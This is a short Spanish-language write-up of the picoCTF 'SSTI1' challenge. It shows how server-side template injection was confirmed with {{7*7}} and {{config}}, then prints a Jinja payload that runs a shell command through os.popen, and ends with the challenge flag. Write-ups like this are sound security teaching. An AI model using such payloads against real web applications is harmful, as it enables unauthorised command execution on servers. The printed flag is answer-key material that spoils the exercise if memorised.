## SSTI1
# Descripción
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:60722/)!
# Solución
Al introducir cualquier cosa, lo único que hace es mostrarlo en grande.

Pero si al momento de introducir información, revisamos los headers, podemos notar que es una aplicación en base a Python
![python](https://blog.qz.sg/content/images/2025/03/SSTI1-headers.webp)

Si introducimos un `{{7 * 7}}`, la aplicación lo tomará como una instrucción y mostrará un `49`
![49](https://blog.qz.sg/content/images/2025/03/SSTI1-ssti-49.webp)

Para saber como está configurada, le pasaremos la introducción `{{config}}` conoceremos un poco más del backend.
![config](https://blog.qz.sg/content/images/2025/03/SSTI1-ssti-config.webp)

Sabiendo esto, ahora le pasaremos este script
````python
{{ namespace.__init__.__globals__.os.popen('grep picoCTF . -rnw').read() }}
````

Y si ahora inspeccionamos la página, encontramos la flag
![flag](https://blog.qz.sg/content/images/2025/03/SSTI1-ssti-flag.webp)

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
# Notas adicionales
- 
# Referencias
- Imágenes tomadas de aquí: https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/